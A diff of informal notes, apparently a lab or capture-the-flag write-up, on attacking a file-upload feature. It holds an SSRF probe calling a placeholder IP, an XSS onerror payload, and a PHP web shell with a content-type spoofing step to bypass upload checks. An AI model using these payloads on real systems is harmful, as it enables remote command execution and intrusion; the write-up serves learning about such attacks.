@@ -192,7 +192,7 @@ Our buddy chatgpt already confirmed that its a ssrf if the payload
 <img src="http://YOUR-IP:8000/test">
 ```
 
-gets executed.
+gets executed without opening the file in new tab after uploading it.
 
 And if it is a xss then below will happens 
 
@@ -209,3 +209,15 @@ and i can get the onerror only via the onerror
 ```
 <img src="invalid.jpg" onerror="alert(1)">
 ```
+
+Until the above writting i was on windows so this gave us a little pain. Now we have switced to our machine so we can continue now.
+
+Now we're going to open burp and intercepting the req to change the filetype in the req.
+
+Now we will upload this php file 
+
+```
+<?php system($_GET['cmd']); ?>
+```
+
+And change the file type to **image/jpeg** and see what happens..
